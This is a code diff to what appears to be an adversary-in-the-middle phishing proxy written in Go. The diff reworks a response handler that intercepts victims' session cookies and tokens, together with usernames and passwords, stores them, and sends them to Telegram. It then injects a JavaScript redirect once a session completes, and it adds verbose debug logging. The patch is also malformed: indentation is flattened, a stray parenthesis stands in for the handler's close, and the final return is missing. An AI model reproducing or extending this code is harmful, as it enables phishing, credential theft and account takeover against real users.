@@ -1348,68 +1348,90 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
-			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-				s, ok := p.sessions[ps.SessionId]
-				if ok && s.IsDone {
+			// ...
 
-					// If we've already sent them, skip sending again:
-					if s.TokensSent {
-						return resp
-					}
+if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+    s, ok := p.sessions[ps.SessionId]
+    if ok && s.IsDone {
 
-					// Because we are in the "authorization" path, do DB writes now
-					if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-						log.Error("database: %v", err)
-					}
-					if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-						log.Error("database: %v", err)
-					}
-					if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-						log.Error("database: %v", err)
-					}
+        // If we've already sent them, skip sending again:
+        if s.TokensSent {
+            return resp
+        }
 
-					// If the tokens are present, proceed
-					if len(s.CookieTokens) > 0 {
-						// Check if this path matches one of the authUrls
-						for _, au := range pl.authUrls {
-							if au.MatchString(resp.Request.URL.Path) {
-								// Log success
-								log.Success("[%d] detected authorization URL - tokens intercepted: %s",
-									ps.Index, resp.Request.URL.Path)
+        // Because we are in the "authorization" path, do DB writes now
+        if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+            log.Error("database: %v", err)
+        }
+        if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+            log.Error("database: %v", err)
+        }
+        if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
+            log.Error("database: %v", err)
+        }
 
-								// Then send them to Telegram
-								p.SendCookies(TokensToJSON(pl, s.CookieTokens),
-									s.Username, s.Password, s.Custom)
-								s.TokensSent = true
-								break
-							}
-						}
-					}
-				}
-			}
+        // If the tokens are present, proceed
+        if len(s.CookieTokens) > 0 {
+            // Check if this path matches one of the authUrls
+            for _, au := range pl.authUrls {
+                if au.MatchString(resp.Request.URL.Path) {
+                    // Log success
+                    log.Success("[%d] detected authorization URL - tokens intercepted: %s",
+                        ps.Index, resp.Request.URL.Path)
 
-			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
-				resp.Header.Set("Cache-Control", "no-cache, no-store")
-			}
+                    // Then send them to Telegram
+                    p.SendCookies(TokensToJSON(pl, s.CookieTokens),
+                        s.Username, s.Password, s.Custom)
+                    s.TokensSent = true
+                    break
+                }
+            }
+        }
+    }
+}
 
-			if pl != nil && ps.SessionId != "" {
-				s, ok := p.sessions[ps.SessionId]
-				if ok && s.IsDone {
-					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && stringExists(string(body), []string{"<head>", "<body>"}) {
-							// redirect only if received response content is of `text/html` content type
-							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+// Optionally ensure we set no-cache for relevant MIME types
+if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
+    resp.Header.Set("Cache-Control", "no-cache, no-store")
+}
 
-							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
-							return resp
-						}
-					}
-				}
-			}
+// HERE you add your debugging block
+if pl != nil && ps.SessionId != "" {
+    s, ok := p.sessions[ps.SessionId]
+    if ok && s.IsDone {
+        log.Debug("DEBUG: Checking final redirect for session %s. s.RedirectURL='%s', s.RedirectCount=%d, MIME='%s', status=%d, body_len=%d",
+            ps.SessionId, s.RedirectURL, s.RedirectCount, mime, resp.StatusCode, len(body),
+        )
 
-			return resp
-		})
+        if s.RedirectURL != "" && s.RedirectCount == 0 {
+            hasHead := strings.Contains(string(body), "</head>")
+            hasBody := strings.Contains(string(body), "</body>")
+            if stringExists(mime, []string{"text/html"}) &&
+               resp.StatusCode == 200 &&
+               len(body) > 0 &&
+               (hasHead || hasBody) {
+
+                log.Debug("DEBUG: Conditions passed; injecting final redirect. hasHead=%v, hasBody=%v", hasHead, hasBody)
+                s.RedirectCount++
+                log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+
+                _, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
+                return resp
+            } else {
+                log.Debug("DEBUG: Skipped final redirect injection. mime=%s code=%d bodyLen=%d hasHead=%v hasBody=%v",
+                    mime, resp.StatusCode, len(body), hasHead, hasBody)
+            }
+        } else {
+            log.Debug("DEBUG: s.RedirectURL is empty or s.RedirectCount != 0, no final redirect. redirectURL='%s', redirectCount=%d",
+                s.RedirectURL, s.RedirectCount)
+        }
+    } else {
+        log.Debug("DEBUG: session not found or not done. s.IsDone=%v, ok=%v, s=%v",
+            ok && s != nil && s.IsDone, ok, s)
+    }
+}
+
+)
 
 	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
